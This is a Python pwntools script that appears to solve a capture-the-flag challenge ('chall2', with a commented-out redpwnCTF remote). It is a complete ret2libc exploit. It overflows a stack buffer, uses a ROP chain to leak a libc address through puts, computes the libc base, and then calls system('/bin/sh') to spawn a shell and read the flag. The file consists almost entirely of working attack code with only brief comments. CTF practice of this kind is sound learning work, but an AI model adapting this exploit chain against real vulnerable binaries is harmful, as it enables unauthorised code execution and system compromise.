#https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjzh-3z3ZfqAhVozDgGHQjGDRYQFjAAegQIAhAB&url=https%3A%2F%2Ftasteofsecurity.com%2Fsecurity%2Fret2libc-unknown-libc%2F&usg=AOvVaw0s8uyI00O2QEIeOsP0q39o

# really don't know how he did that 

from pwn import * # Import pwntools

p = process("./chall2") # start the vuln binary
#p = remote('2020.redpwnc.tf', 31350)
elf = ELF("./chall2")# Extract data from binary
libc = ELF("libc.so.6")
rop = ROP(elf)# Find ROP gadgets
PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]# Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

#Overflow buffer until return address
base = 16*b'A' + 8*b'B'

# Create rop chain
rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS) + p64(MAIN)

#Send our rop-chain payload
p.recvline()
p.sendline( rop)

#Parse leaked address
p.recvline()
p.recvline()
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))


libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

BINSH = next(libc.search("/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

rop2 = base + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
print(rop2)
p.recvline()
p.sendline(rop2)
p.sendline(b'cat flag.txt')
p.recvline()

p.interactive()

